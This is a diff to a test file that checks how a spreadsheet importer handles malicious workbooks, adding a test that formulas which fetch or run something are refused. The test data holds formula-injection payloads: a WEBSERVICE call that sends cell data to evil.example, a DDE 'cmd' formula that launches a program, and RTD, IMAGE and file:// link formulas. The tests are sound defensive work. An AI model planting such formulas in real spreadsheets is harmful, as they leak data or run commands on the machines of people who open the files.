@@ -156,9 +156,8 @@ class MaliciousWorkbookTests(SimpleTestCase):
 
     def test_formulas_are_never_run_or_imported(self):
         def setup(ws):
-            ws['E2'] = '=WEBSERVICE("http://evil.example/"&B2)'   # a formula: no saved value
-            ws['E3'] = '=1+1'
-            ws['B4'] = '=cmd|\' /C calc\'!A0'                  # a formula in the description
+            ws['E3'] = '=1+1'                                    # a formula: no saved value
+            ws['B4'] = '=B2&" extra"'                            # a formula in the description
             ws['B5'].value = '=HYPERLINK("http://evil.example")'
             ws['B5'].data_type = 's'                             # text that merely looks like a formula
         f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr'], ['J2', 'Units', 8, 'm'], ['J3', None, 1, 'nr'], ['J4', None, 1, 'nr']],
@@ -171,6 +170,14 @@ class MaliciousWorkbookTests(SimpleTestCase):
         self.assertEqual(got['J4'].description, '=HYPERLINK("http://evil.example")')  # kept as text, exported safely
         from levelling.exports import safe
         self.assertEqual(safe(got['J4'].description)[0], "'")
+
+    def test_formulas_that_fetch_or_run_something_are_refused(self):
+        for formula in ('=WEBSERVICE("http://evil.example/"&B2)', '=cmd|\' /C calc\'!A0', '=_xlfn.IMAGE("http://x.example/a.png")',
+                        '=RTD("prog.id",,"x")', '=HYPERLINK("file:///c:/x.txt")'):
+            with self.subTest(formula):
+                f = xlsx([HEAD, ['J1', 'Desk', 1, 'nr']], setup=lambda ws, formula=formula: ws.__setitem__('E2', formula))
+                with self.assertRaisesMessage(WorkbookRefused, 'cell E2'):
+                    importer.read(f)
 
     def test_sheet_claiming_huge_dimensions_reads_quickly(self):
         def setup(ws):
